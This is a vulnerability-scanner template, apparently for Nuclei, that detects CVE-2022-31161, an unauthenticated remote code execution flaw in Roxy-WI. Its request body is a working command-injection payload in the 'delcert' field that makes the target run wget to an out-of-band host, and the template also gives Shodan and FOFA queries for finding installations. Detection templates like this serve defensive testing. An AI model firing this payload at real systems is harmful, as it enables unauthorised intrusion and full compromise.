id: CVE-2022-31161

info:
  name: Roxy-WI Remote Code Execution Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: Roxy-WI before 6.1.1.0 allows unauthenticated remote code execution via the ssl_cert upload feature in /app/options.py.
  impact: |
    Successful exploitation could result in unauthorized access, data theft, and complete system compromise.
  remediation: |
    Apply the latest security patches provided by the vendor to mitigate the vulnerability.
  reference:
    - http://packetstormsecurity.com/files/171652/Roxy-WI-6.1.1.0-Remote-Code-Execution.html
    - https://github.com/hap-wi/roxy-wi/releases/tag/v6.1.1.0
    - https://github.com/hap-wi/roxy-wi/security/advisories/GHSA-pg3w-8p63-x483
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L
    cvss-score: 10
    cve-id: CVE-2022-31161
    cwe-id: CWE-77,CWE-434
    epss-score: 0.03622
    epss-percentile: 0.91993
    cpe: cpe:2.3:a:roxy-wi:roxy-wi:*:*:*:*:*:*:*:*
  metadata:
    vendor: roxy-wi
    product: roxy-wi
    shodan-query: http.html:"Roxy-WI"
    fofa-query: body="roxy-wi"
  tags: packetstorm

http:
  - method: POST
    path:
      - "{{BaseURL}}/app/options.py"

    headers:
      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
      Accept: "*/*"
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      X-Requested-With: XMLHttpRequest
      Origin: "{{BaseURL}}"
      Referer: "{{BaseURL}}/app/login.py"
      Connection: close

    body: |
      show_versions=1&token=&alert_consumer=notNull&serv=127.0.0.1&delcert=a%20&%20wget%20{{interactsh-url}};
    matchers:
      - type: word
        words:
          - "HTTP request sent, awaiting response"
        part: interactsh_protocol
